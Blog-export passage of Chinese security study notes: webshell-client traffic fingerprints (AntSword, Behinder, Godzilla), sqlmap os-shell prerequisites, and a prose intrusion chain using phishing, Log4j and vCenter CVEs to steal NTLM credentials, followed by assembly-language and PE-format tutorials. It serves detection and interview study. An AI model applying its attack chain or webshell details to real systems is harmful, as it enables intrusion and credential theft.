<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-14ae1dac-9a0f-1.jpg"><img src="/image/20210410231152-14ae1dac-9a0f-1.jpg" alt="img"></a></p>
<p>base64：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-14cd88fe-9a0f-1.jpg"><img src="/image/20210410231152-14cd88fe-9a0f-1.jpg" alt="img"></a></p>
<p>rot13：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231153-14ee819e-9a0f-1.jpg"><img src="/image/20210410231153-14ee819e-9a0f-1.jpg" alt="img"></a></p>
<p><strong>总结</strong></p>
<ul>
<li>使用对应的编码器编码算法进行解码</li>
<li>php使用assert和eval；asp使用eval；jsp使用classloader加载</li>
<li>文件操作的流量，会有_0x开头的参数，与编码器无关</li>
</ul>
<h3 id="冰蝎2-0"><a href="#冰蝎2-0" class="headerlink" title="冰蝎2.0"></a>冰蝎2.0</h3><p>webshell源码</p>
<img src="/image/20210405205409-03663e4e-960e-1.png" alt="img" style="zoom: 50%;" />

<p>分析：</p>
<p>首先对get传入的参数pass进行检查，如果存在则以时间方式生成一个长度16的key存入到session中；再判断是否开启openssl拓展，如果开启了就会进行AES解密得到<strong>中继字符串</strong>，即<code>assert|eval(&quot;phpinfo();&quot;)</code>，这是固定定义好的；接着用explode函数拆分中继字符串为字符串数组；再以可变函数的形式，以索引为0的数组元素调用索引为1的数组元素，即<code>assert(&quot;eval(&quot;phpinfo;&quot;)&quot;)</code>；如果没有开启openssl拓展，则进行异或处理然后base64加密。</p>
<p>流量分析</p>
<p><img src="/image/20210405205439-1566c91a-960e-1.jpg" alt="img"></p>
<p>首先发送了两次get请求，第一次请求对应刚刚的16位key并写入session中，与当前会话绑定；第二次请求则获取key，此时的key为解密的key，解密出来的内容还有一层base64编码</p>
<p>是否开启openssl</p>
<p><img src="/image/20210405205532-34dab842-960e-1.png" alt="img"></p>
<p><strong>总结</strong></p>
<ul>
<li>采用AES对称加密</li>
<li>采用密钥协商机制，第一阶段返回200和16位明文连接密码</li>
<li>建立连接之后的所有请求cookie格式都为path&#x3D;&#x2F;；</li>
<li>php中存在eval和assert等字符特征</li>
<li>asp中会在for循环中进行异或处理</li>
<li>jsp中存在classloader和getclass().getclassloader()等字符特征</li>
</ul>
<p><img src="/image/image-20220605203147800.png" alt="image-20220605203147800"></p>
<h3 id="冰蝎3-0"><a href="#冰蝎3-0" class="headerlink" title="冰蝎3.0"></a>冰蝎3.0</h3><p><strong>总结</strong></p>
<ul>
<li>内置默认的十六种ua头（可更改）</li>
<li>交流无明文，采用预共享密钥</li>
<li>默认的webshell存在16位数的连接密码(md5 32位的前16，默认密码明文为rebeyond)</li>
<li>在建立连接后使用命令执行功能时，请求包中content-length为5740或5720</li>
<li>每一个请求头中存在Pragma:no-cache,cache-control:no-cache</li>
</ul>
<p><img src="/image/image-20220605203138996.png" alt="image-20220605203138996"></p>
<h3 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h3><p><strong>总结</strong></p>
<ul>
<li>base64加密</li>
<li>php，asp都有eval；jsp有sc，pass，classloader，getclass().getclassloader()等</li>
<li>响应头部中大部分存在cache-control:no-store，no-cache，must-revalidate</li>
<li>cookie值的最后都以”；”结尾</li>
<li>生成的shell因为使用了TCP长连接会生成3个http包：第一个包发送一长段payload，一般是一个变量加上一堆加密过后的值，且http的响应为空；第二个包发送一段与先前的变量名相同，加一串密文，解密之后可以获得methodName&#x3D;test，目的是为了测试shell的连通情况，并给客户端打印ok，内容固定；第三个包发送类似第二个包，加密的内容从test变成了getBasicsInfo，用于调用之前payload的内容将目标环境信息向客户端返回。</li>
</ul>
<p><img src="/image/image-20220605203120830.png" alt="image-20220605203120830"></p>
<h2 id="Webshell客户端使用上的区别"><a href="#Webshell客户端使用上的区别" class="headerlink" title="Webshell客户端使用上的区别"></a>Webshell客户端使用上的区别</h2><ul>
<li>蚁剑：有多种编码器&#x2F;解码器，可进行流量混淆绕过waf，开源可自行编写插件</li>
<li>冰蝎：</li>
</ul>
<h2 id="sqlmap-–os-shell原理"><a href="#sqlmap-–os-shell原理" class="headerlink" title="sqlmap –os-shell原理"></a>sqlmap –os-shell原理</h2><ul>
<li>知道网站物理路径</li>
<li>拥有sa权限</li>
<li>secure_file_priv无限制</li>
<li>网站路径有写入权限</li>
</ul>
<h2 id="护网小作文系列（雾"><a href="#护网小作文系列（雾" class="headerlink" title="护网小作文系列（雾"></a>护网小作文系列（雾</h2><h3 id="溯源经历"><a href="#溯源经历" class="headerlink" title="溯源经历"></a>溯源经历</h3><h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>首先在目标站点的首页上发现存在在线客服站点，通过钓鱼下木马拿到了客服个人PC权限，并且该pc处于cloud.local域内，通过对该域的信息搜集发现了VMware Horizon服务器，对其进行了分析，发现其所在的版本8.0处于Log4j2远程代码执行漏洞（CVE-2021-44228）的影响范围中，通过该漏洞写入内存马成功拿到该服务器权限，从该服务器横向移动拿到了域控主机权限，通过域控获取到了域下的vcenter服务器从vcenter后台发现了运维机，经分析发现存在CVE-2021-22005任意文件上传漏洞，通过上传木马拿到了运维机的权限，接着获取到了本地rdp联机密码以及NTLM凭据，由此进一步拿到了另一台FTP服务器，扫描同网段获取到了第二台vcenter服务器地址，同样存在CVE-2021-22005任意文件上传漏洞，上传木马拿到第二台vcenter后台，通过console口上线</p>
]]></content>
      <categories>
        <category>面经</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>hvv</tag>
        <tag>面经</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言</title>
    <url>/2024/03/27/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/</url>
    <content><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>CPU 只负责计算，本身不具备智能。你输入一条指令（instruction），它就运行一次，然后停下来，等待下一条指令。<br>这些指令都是二进制的，称为操作码（opcode），比如加法指令就是00000011。编译器的作用，就是将高级语言写好的程序，翻译成一条条操作码。<br>对于人类来说，二进制程序是不可读的，根本看不出来机器干了什么。为了解决可读性的问题，以及偶尔的编辑需求，就诞生了汇编语言。</p>
<p><strong>汇编语言是二进制指令的文本形式</strong>，与指令是一一对应的关系。比如，加法指令<code>00000011</code>写成汇编语言就是 ADD。只要还原成二进制，汇编语言就可以被 CPU 直接执行，所以它是最底层的低级语言。</p>
<h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p>CPU 本身只负责运算，不负责储存数据。数据一般都储存在内存之中，CPU 要用的时候就去内存读写数据。但是，CPU 的运算速度远高于内存的读写速度，为了避免被拖慢，CPU 都自带一级缓存和二级缓存。基本上，CPU 缓存可以看作是读写速度较快的内存。</p>
<p>但是，CPU 缓存还是不够快，另外数据在缓存里面的地址是不固定的，CPU 每次读写都要寻址也会拖慢速度。因此，除了缓存之外，CPU 还自带了寄存器（register），用来储存最常用的数据。也就是说，那些最频繁读写的数据（比如循环变量），都会放在寄存器里面，CPU 优先读写寄存器，再由寄存器跟内存交换数据。<br><img src="/image/Pasted image 20240327102551.png" alt="20240327102551.png" /><br>寄存器不依靠地址区分数据，而依靠名称。每一个寄存器都有自己的名称，我们告诉 CPU 去具体的哪一个寄存器拿数据，这样的速度是最快的。有人比喻寄存器是 CPU 的零级缓存。</p>
<h2 id="寄存器的种类"><a href="#寄存器的种类" class="headerlink" title="寄存器的种类"></a>寄存器的种类</h2><p>早期的 x86 CPU 只有8个寄存器，而且每个都有不同的用途。现在的寄存器已经有100多个了，都变成通用寄存器，不特别指定用途了，但是早期寄存器的名字都被保存了下来。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EAX</span><br><span class="line">EBX</span><br><span class="line">ECX</span><br><span class="line">EDX</span><br><span class="line">EDI</span><br><span class="line">ESI</span><br><span class="line">EBP</span><br><span class="line">ESP</span><br></pre></td></tr></table></figure>
<p>前六个为通用寄存器，还有两个特殊的寄存器：<br><strong>EBP又叫做基址指针寄存器</strong>，其内存放着一个指针（帧指针），该指针永远指向系统栈最上面一个栈帧的底部。所以ebp指向的是栈的栈底的数据。<br><strong>ESP又叫做栈指针寄存器</strong>，其内存放着一个指针（栈指针），该指针永远指向系统栈最上面一个栈帧的栈顶。所以esp指向的是栈的栈顶的数据。<br><img src="/image/Pasted image 20240327112702.png" alt="20240327112702.png" /><br>32位&#x2F;64位指寄存器的大小，32位为4字节，64位为8字节。</p>
<h1 id="内存模型：Heap"><a href="#内存模型：Heap" class="headerlink" title="内存模型：Heap"></a>内存模型：Heap</h1><p>寄存器只能存放很少量的数据，大多数时候，CPU 要指挥寄存器，直接跟内存交换数据。所以，除了寄存器，还必须了解内存怎么储存数据。<br>程序运行的时候，操作系统会给它分配一段内存，用来储存程序和运行产生的数据。这段内存有起始地址和结束地址，比如从<code>0x1000</code>到<code>0x8000</code>，起始地址是较小的那个地址，结束地址是较大的那个地址。<br><img src="/image/Pasted image 20240327115439.png" alt="20240327115439.png" /><br>程序运行过程中，对于动态的内存占用请求（比如新建对象，或者使用<code>malloc</code>命令），系统就会从预先分配好的那段内存之中，划出一部分给用户，具体规则是从起始地址开始划分（实际上，起始地址会有一段静态数据，这里忽略）。举例来说，用户要求得到10个字节内存，那么从起始地址<code>0x1000</code>开始给他分配，一直分配到地址<code>0x100A</code>，如果再要求得到22个字节，那么就分配到<code>0x1020</code>。<br><img src="/image/Pasted image 20240327115703.png" alt="20240327115703.png" /><br><img src="/image/Pasted image 20240327115734.png" alt="20240327115734.png" /><br><img src="/image/Pasted image 20240327115748.png" alt="20240327115748.png" /><br>这种因为用户主动请求而划分出来的内存区域，叫做 <strong>Heap（堆）</strong>。它由起始地址开始，<strong>从低位（地址）向高位（地址）增长</strong>。Heap 的一个重要特点就是不会自动消失，必须手动释放，或者由垃圾回收机制来回收。</p>
<h1 id="内存模型：Stack"><a href="#内存模型：Stack" class="headerlink" title="内存模型：Stack"></a>内存模型：Stack</h1><p>除了 Heap 以外，其他的内存占用叫做 Stack（栈）。简单说，Stack 是由于函数运行而临时占用的内存区域。<br><img src="/image/Pasted image 20240327115946.png" alt="20240327115946.png" /></p>
<h2 id="例"><a href="#例" class="headerlink" title="例"></a>例</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">int</span> a = <span class="number">2</span>;</span><br><span class="line">   <span class="type">int</span> b = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，系统开始执行<code>main</code>函数时，会为它在内存里面建立一个帧（frame），所有<code>main</code>的内部变量（比如<code>a</code>和<code>b</code>）都保存在这个帧里面。<code>main</code>函数执行结束后，该帧就会被回收，释放所有的内部变量，不再占用空间。<br><img src="/image/Pasted image 20240327120101.png" alt="20240327120101.png" /><br>如果函数内部调用了其他函数，会发生什么情况？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">int</span> a = <span class="number">2</span>;</span><br><span class="line">   <span class="type">int</span> b = <span class="number">3</span>;</span><br><span class="line">   <span class="keyword">return</span> add_a_and_b(a, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>main</code>函数内部调用了<code>add_a_and_b</code>函数。执行到这一行的时候，系统也会为<code>add_a_and_b</code>新建一个帧，用来储存它的内部变量。也就是说，此时同时存在两个帧：<code>main</code>和<code>add_a_and_b</code>。一般来说，调用栈有多少层，就有多少帧。<br><img src="/image/Pasted image 20240327120221.png" alt="20240327120221.png" /><br>等到<code>add_a_and_b</code>运行结束，它的帧就会被回收，系统会回到函数<code>main</code>刚才中断执行的地方，继续往下执行。通过这种机制，就实现了函数的层层调用，并且每一层都能使用自己的本地变量。</p>
<p>所有的帧都存放在 Stack，由于帧是一层层叠加的，所以 Stack 叫做栈。生成新的帧，叫做”入栈”，英文是 push；栈的回收叫做”出栈”，英文是 pop。Stack 的特点就是，最晚入栈的帧最早出栈（因为最内层的函数调用，最先结束运行），这就叫做”后进先出”的数据结构。每一次函数执行结束，就自动释放一个帧，所有函数执行结束，整个 Stack 就都释放了。<br><img src="/image/Pasted image 20240327134010.png" alt="20240327134010.png" /><br><img src="/image/Pasted image 20240327134014.png" alt="20240327134014.png" /><br>Stack 是由内存区域的结束地址开始，<strong>从高位（地址）向低位（地址）分配</strong>。比如，内存区域的结束地址是<code>0x8000</code>，第一帧假定是16字节，那么下一次分配的地址就会从<code>0x7FF0</code>开始；第二帧假定需要64字节，那么地址就会移动到<code>0x7FB0</code>。<br><img src="/image/Pasted image 20240327134551.png" alt="20240327134551.png" /></p>
<h1 id="CPU指令"><a href="#CPU指令" class="headerlink" title="CPU指令"></a>CPU指令</h1><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add_a_and_b</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> add_a_and_b(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用gcc转成汇编语言，为了方便调试，我们需要关闭优化、栈保护、内存随机化等<br><code>gcc -m32 -O0 -fno-stack-protector -fno-pie -no-pie -fcf-protection=none -S example.c</code><br>64位：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">        .file   <span class="string">&quot;example.c&quot;</span></span><br><span class="line">        .text</span><br><span class="line">        .globl  add_a_and_b</span><br><span class="line">        .type   add_a_and_b, @function</span><br><span class="line">add_a_and_b:</span><br><span class="line">.LFB0:</span><br><span class="line">        .cfi_startproc</span><br><span class="line">        pushl   %ebp</span><br><span class="line">        .cfi_def_cfa_offset <span class="number">8</span></span><br><span class="line">        .cfi_offset <span class="number">5</span>, <span class="number">-8</span></span><br><span class="line">        movl    %esp, %ebp</span><br><span class="line">        .cfi_def_cfa_register <span class="number">5</span></span><br><span class="line">        movl    <span class="number">8</span>(%ebp), %edx</span><br><span class="line">        movl    <span class="number">12</span>(%ebp), %eax</span><br><span class="line">        addl    %edx, %eax</span><br><span class="line">        popl    %ebp</span><br><span class="line">        .cfi_restore <span class="number">5</span></span><br><span class="line">        .cfi_def_cfa <span class="number">4</span>, <span class="number">4</span></span><br><span class="line">        ret</span><br><span class="line">        .cfi_endproc</span><br><span class="line">.LFE0:</span><br><span class="line">        .size   add_a_and_b, .-add_a_and_b</span><br><span class="line">        .globl  main</span><br><span class="line">        .type   main, @function</span><br><span class="line">main:</span><br><span class="line">.LFB1:</span><br><span class="line">        .cfi_startproc</span><br><span class="line">        pushl   %ebp</span><br><span class="line">        .cfi_def_cfa_offset <span class="number">8</span></span><br><span class="line">        .cfi_offset <span class="number">5</span>, <span class="number">-8</span></span><br><span class="line">        movl    %esp, %ebp</span><br><span class="line">        .cfi_def_cfa_register <span class="number">5</span></span><br><span class="line">        pushl   $<span class="number">3</span></span><br><span class="line">        pushl   $<span class="number">2</span></span><br><span class="line">        call    add_a_and_b</span><br><span class="line">        addl    $<span class="number">8</span>, %esp</span><br><span class="line">        leave</span><br><span class="line">        .cfi_restore <span class="number">5</span></span><br><span class="line">        .cfi_def_cfa <span class="number">4</span>, <span class="number">4</span></span><br><span class="line">        ret</span><br><span class="line">        .cfi_endproc</span><br><span class="line">.LFE1:</span><br><span class="line">        .size   main, .-main</span><br><span class="line">        .ident  <span class="string">&quot;GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0&quot;</span></span><br><span class="line">        .section        .note.GNU-<span class="built_in">stack</span>,<span class="string">&quot;&quot;</span>,@progbits</span><br></pre></td></tr></table></figure>
<p>简化一下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_add_a_and_b:</span><br><span class="line">   push   %ebx</span><br><span class="line">   mov    %ebp, %esp</span><br><span class="line">   mov    %eax, [%esp+<span class="number">8</span>] </span><br><span class="line">   mov    %ebx, [%esp+<span class="number">12</span>]</span><br><span class="line">   add    %eax, %ebx </span><br><span class="line">   pop    %ebx </span><br><span class="line">   ret  </span><br><span class="line"></span><br><span class="line">_main:</span><br><span class="line">   push   <span class="number">3</span></span><br><span class="line">   push   <span class="number">2</span></span><br><span class="line">   call   _add_a_and_b </span><br><span class="line">   add    %esp, <span class="number">8</span></span><br><span class="line">   ret</span><br></pre></td></tr></table></figure>
<p>原程序的两个函数<code>add_a_and_b</code>和<code>main</code>，对应两个标签<code>_add_a_and_b</code>和<code>_main</code>。每个标签里面是该函数所转成的 CPU 运行流程。<br>每一行就是 CPU 执行的一次操作。它又分成两部分，就以其中一行为例。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push   %ebx</span><br></pre></td></tr></table></figure>
<p><code>push</code>是 CPU 指令，<code>%ebx</code>是该指令要用到的运算子。一个 CPU 指令可以有零个到多个运算子。</p>
<h3 id="push指令"><a href="#push指令" class="headerlink" title="push指令"></a>push指令</h3><p>程序从<code>_main</code>标签开始执行，这时会在 Stack 上为<code>main</code>建立一个帧，并将 Stack 所指向的地址，写入 ESP 寄存器。后面如果有数据要写入<code>main</code>这个帧，就会写在 ESP 寄存器所保存的地址。<br><img src="/image/Pasted image 20240327151530.png" alt="20240327151530.png" /><br><img src="/image/Pasted image 20240327152412.png" alt="20240327152412.png" /><br><img src="/image/Pasted image 20240327154605.png" alt="20240327154605.png" /><br>然后开始执行第一行代码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">push   <span class="number">3</span>    <span class="comment">//注：前两个图在windows环境下使用mov，没有压栈，第三张图在linux环境下32位进行了压栈</span></span><br></pre></td></tr></table></figure>
<p><code>push</code>指令用于将运算子放入 Stack，这里就是将<code>3</code>写入<code>main</code>这个帧。<br>虽然看上去很简单，<code>push</code>指令其实有一个前置操作。它会先取出 ESP 寄存器里面的地址，将其减去4个字节，然后将新地址写入 ESP 寄存器。使用减法是因为 Stack 从高位向低位发展，4个字节则是因为<code>3</code>的类型是<code>int</code>，占用4个字节。得到新地址以后， 3 就会写入这个地址开始的四个字节，注意下面寄存器的变化。<br><img src="/image/Pasted image 20240327155808.png" alt="20240327155808.png" /><br>栈状态如下：<br><img src="/image/Pasted image 20240327155251.png" alt="20240327155251.png" /><br>寄存器状态如下，此时已经取出了ESP中的值到EBP：<br><img src="/image/Pasted image 20240327155348.png" alt="20240327155348.png" /><br>执行第一条push执行后寄存器的状态，发现此时ESP的值减去4个字节：<br><img src="/image/Pasted image 20240327155459.png" alt="20240327155459.png" /><br>查看栈状态发现已经将32位的3压入了栈原来ESP的地址：<br><img src="/image/Pasted image 20240327160130.png" alt="20240327160130.png" /><br>接着同样执行第二条push指令，<code>push</code>指令将<code>2</code>写入<code>main</code>这个帧，位置紧贴着前面写入的<code>3</code>。这时，ESP 寄存器会再减去 4个字节（累计减去8）。<br><img src="/image/Pasted image 20240327160300.png" alt="20240327160300.png" /></p>
<img src="/image/Pasted image 20240327160319.png" alt="20240327160319.png" />

<img src="/image/Pasted image 20240327160519.png" alt="20240327160519.png" />
### call指令
第三行的call指令用来调用函数。
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">call   _add_a_and_b</span><br></pre></td></tr></table></figure>
上面的代码表示调用`add_a_and_b`函数。这时，程序就会去找`_add_a_and_b`标签，并为该函数建立一个新的帧。
下面就开始执行`_add_a_and_b`的代码。
<img src="/image/Pasted image 20240327161218.png" alt="20240327161218.png" />
我们可以看到首先就进行了一个push操作
这一行表示将 EBX 寄存器里面的值，写入`_add_a_and_b`这个帧，将当前指令的下一个地址（即函数的返回地址）压入栈中，并跳转到被调用函数的入口点，这一步是为了保存上一个函数的返回地址，后面会用到。
<img src="/image/Pasted image 20240327161440.png" alt="20240327161440.png" />
这时，`push`指令会再将 ESP 寄存器里面的地址减去4个字节（累计减去12）。
> Ubuntu20.04上会默认编译出endbr32指令，用于验证是否位32位，在不存在这条指令的时候可以忽略
### mov指令
`mov`指令用于将一个值写入某个寄存器。
<img src="/image/Pasted image 20240327164950.png" alt="20240327164950.png" />
> 注意这里有一个 mov ebp, esp的操作，这一步是用于设置新的基址指针，为了把上一栈帧的顶部变成这个栈帧的底部，有些环境下存在，有些环境下没有。虽然将ESP的值赋给EBP并不是绝对必需的，但它是一种编写可读性更好的汇编代码的常见实践。在大多数情况下，它可以简化对参数和局部变量的访问，并且使得调试代码更加方便。

<p>此时可以看到EBP的值减去了16，这一步是为了后面取值做准备。<br>接下来的两条mov指令，分别在栈内取了ebp+8和ebp+0xc后的四个字节内存中的值，并分别写入edx和eax寄存器。<br><img src="/image/Pasted image 20240327162713.png" alt="20240327162713.png" /></p>
<h3 id="add指令"><a href="#add指令" class="headerlink" title="add指令"></a>add指令</h3><p><code>add</code>指令用于将两个运算子相加，并将结果写入第一个运算子。<br>这条指令将 EAX 寄存器的值（即2）加上 EBX 寄存器的值（即3），得到结果5，再将这个结果写入第一个运算子 EAX 寄存器。<br><img src="/image/Pasted image 20240327172317.png" alt="20240327172317.png" /></p>
<h3 id="pop指令"><a href="#pop指令" class="headerlink" title="pop指令"></a>pop指令</h3><p><code>pop</code>指令用于取出 Stack 最近一个写入的值（即最低位地址的值），并将这个值写入运算子指定的位置。<br>这条指令用于取出 Stack 最近写入的值（即 EBP 寄存器的原始值），再将这个值写回 EBP 寄存器（因为加法已经做完了，EBP 寄存器用不到了）。<br>注意，<code>pop</code>指令还会将 ESP 寄存器里面的地址加4，即回收4个字节。<br><img src="/image/Pasted image 20240327165452.png" alt="20240327165452.png" /></p>
<h3 id="ret指令"><a href="#ret指令" class="headerlink" title="ret指令"></a>ret指令</h3><p><code>ret</code>指令用于终止当前函数的执行，将运行权交还给上层函数。也就是，当前函数的帧将被回收。<br>在执行<code>call</code>指令的时候，我们首先进行了一个<code>push</code>指令将ebp的值压入了栈，此时栈顶正好回收完毕到达了这个地址。<br>执行 <code>ret</code> 指令会从栈顶弹出一个地址，该地址就是调用该函数之前的下一个指令的地址，即函数的返回地址。<br><img src="/image/Pasted image 20240327171724.png" alt="20240327171724.png" /><br>执行<code>ret</code>指令，先从栈顶弹出4个字节，此时esp-4，再进行跳转<br><img src="/image/Pasted image 20240327172626.png" alt="20240327172626.png" /></p>
<h3 id="leave指令"><a href="#leave指令" class="headerlink" title="leave指令"></a>leave指令</h3><p><code>ret</code>指令结束之后，回到了main函数执行call指令的下一条指令<br>将 ESP 寄存器里面的地址，手动加上8个字节，再写回 ESP 寄存器。这是因为 ESP 寄存器的是 Stack 的写入开始地址，前面的<code>pop</code>操作已经回收了4个字节，这里再回收8个字节，等于全部回收。<br><img src="/image/Pasted image 20240327172825.png" alt="20240327172825.png" /><br>可以看到正好还剩8个字节，将esp+8后成功回收了<code>add_a_and_b</code>函数的栈<br><img src="/image/Pasted image 20240327173016.png" alt="20240327173016.png" /><br>最后通过<code>leave</code>清空栈<br><img src="/image/Pasted image 20240327173312.png" alt="20240327173312.png" /><br>完成整个函数调用。</p>
<h1 id="if条件判断汇编分析"><a href="#if条件判断汇编分析" class="headerlink" title="if条件判断汇编分析"></a>if条件判断汇编分析</h1><h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><p>这里我们写一个简单的if条件判断语句。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构</title>
    <url>/2024/03/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h1 id="PE结构"><a href="#PE结构" class="headerlink" title="PE结构"></a>PE结构</h1><img src="/image/Pasted image 20240328112106.png" alt="20240328112106.png" />
## 概念
**PE**(Portable Execute)文件是Windows下可执行文件的总称，常见的有 DLL，EXE，OCX，SYS 等。它是微软在 UNIX 平台的 COFF(通用对象文件格式)基础上制作而成。最初设计用来提高程序在不同操作系统上的移植性，但实际上这种文件格式仅用在 Windows 系列操作系统下。PE文件是指 32 位可执行文件，也称为PE32。64位的可执行文件称为 PE+ 或 PE32+，是PE(PE32)的一种扩展形式(不是PE64)。

<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>地址</td>
<td>是 “虚拟地址” 而不是“物理地址”。不是“物理地址”的原因shi数据在内存的位置经常在变，这样可以节省内存开支、避开错误的内存位置等的优势。同时用户并不需要知道具体的“真实地址”，因为系统自己会为程序准备好内存空间的(只要内存足够大)</td>
</tr>
<tr>
<td>节</td>
<td>节 是 PE 文件中 代码 或 数据 的基本单元。原则上讲，节只分为 “代码节” 和 “数据节” 。</td>
</tr>
<tr>
<td>镜像文件</td>
<td>包含以 EXE 文件为代表的 “可执行文件”、以DLL文件为代表的“动态链接库”。因为他们常常被直接“复制”到内存，有“镜像”的某种意思。</td>
</tr>
<tr>
<td>RVA</td>
<td>Relatively Virtual Address。偏移(又称“相对虚拟地址”)。相对镜像基址的偏移。</td>
</tr>
<tr>
<td>VA</td>
<td>Virtual Address。基址。</td>
</tr>
</tbody></table>
<h1 id="PA-物理地址-VA-虚拟地址-RVA-相对虚拟地址"><a href="#PA-物理地址-VA-虚拟地址-RVA-相对虚拟地址" class="headerlink" title="PA(物理地址)&#x2F;VA(虚拟地址)&#x2F;RVA(相对虚拟地址)"></a>PA(物理地址)&#x2F;VA(虚拟地址)&#x2F;RVA(相对虚拟地址)</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>当一个 PE 文件被加载到内存中以后，我们称之为”映象”(image)</p>
<p>每个程序拥有自己的地址空间，这个地址空间被分割成多个块，每一块称作一页或<strong>页面</strong>(page)。每一页有连续的地址范围。这些页被映射到物理内存，但并不是所有的地址空间必须在内存中才能运行程序。当程序引用一部分在物理内存中的地址空间时，有硬件立刻执行必要的映射。当程序引用的到一部分不在物理内存中的地址空间时，由操作系统负责将缺的部分装入物理内存并重新执行失败的指令。</p>
<p>从某个角度来讲，虚拟内存是对基址寄存器和界限寄存器的一种综合。虚拟存储器的基本思想是程序，数据，堆栈的总的大小可以超过物理存储器的大小，<strong>操作系统把当前使用的部分保留在内存中，而把其他未被使用的部分保存在磁盘上</strong>。</p>
<h2 id="线性地址"><a href="#线性地址" class="headerlink" title="线性地址"></a>线性地址</h2><p><strong>线性地址</strong>（Linear Address） 是逻辑地址到物理地址变换之间的中间层。程序代码会产生逻辑地址，或说是段中的偏移地址，加上相应段的基地址就生成了一个线性地址。如果启用了分页机制，那么线性地址能再经变换以产生一个物理地址。若没有启用分页机制，那么线性地址直接就是物理地址。Intel 80386 的线性地址空间容量为 4G（2的32次方即32根地址总线寻址）</p>
<h2 id="逻辑地址"><a href="#逻辑地址" class="headerlink" title="逻辑地址"></a>逻辑地址</h2><p><strong>逻辑地址</strong>（Logical Address） 是指由程式产生的和段相关的偏移地址部分。例如，你在进行 C 语言指针编程中，能读取指针变量本身值( &amp;操作 )，实际上这个值就是逻辑地址，他是相对于你当前进程数据段的地址，不和绝对物理地址相干。只有在 Intel 实模式下，逻辑地址才和物理地址相等（因为实模式没有分段或分页机制，cpu不进行自动地址转换）；逻辑也就是在Intel保护模式下程式执行代码段限长内的偏移地址（假定代码段、数据段如果完全相同）</p>
<h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><img src="/image/Pasted image 20240328112958.png" alt="20240328112958.png" />
大部分虚拟内存中使用一种**分页**(paging)的技术。

<p>当程序执行下面的指令时，它把地址为1000的内存单元的内容复制到REG中。地址可以通过索引、基址寄存器、段寄存器或其他方式产生。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">MOV REG, <span class="number">1000</span></span><br></pre></td></tr></table></figure>

<p>由程序产生的这些地址称为<strong>虚拟地址</strong>(VA)，他们构成了一个<strong>虚拟地址空间</strong>。在没有虚拟内存的计算机上，系统直接将虚拟地址送到内存总线上，读写操作使用具有同样地址的物理内存字；在使用虚拟内存的情况下，虚拟地址不是被直接送到内存的总线上，而是被送到<strong>内存管理单元（MMU）,MMU把虚拟地址映射为物理内存地址</strong>。</p>
<h2 id="MMU"><a href="#MMU" class="headerlink" title="MMU"></a>MMU</h2><p>实现VA到PA的映射（因此实现方便的动态内存管理）； 实现不同的访问权限。<br><img src="/image/Pasted image 20240328113338.png" alt="20240328113338.png" /><br>虚拟地址空间按照固定大小划分称为<strong>页面</strong>（page）的若干单元。在物理内存中对应的单元称为<strong>页框</strong>（page frame）。页面和页框的大小通常是一样的。实际系统中的页面大小从512字节到1GB。</p>
<h2 id="转换检测缓冲区"><a href="#转换检测缓冲区" class="headerlink" title="转换检测缓冲区"></a>转换检测缓冲区</h2><p><strong>转换检测缓冲区（Translation Lookaside Buffer，TLB）</strong>：虚拟地址到物理地址的映射必须非常快，所以采用TLB，<strong>将虚拟地址直接映射到物理地址</strong>。</p>
<h2 id="基地址和偏移地址"><a href="#基地址和偏移地址" class="headerlink" title="基地址和偏移地址"></a>基地址和偏移地址</h2><p>cpu和内存之间通过20条地址总线相连接，地址总线就是cpu通过地址找到对应的内存的物理数据的传递工具</p>
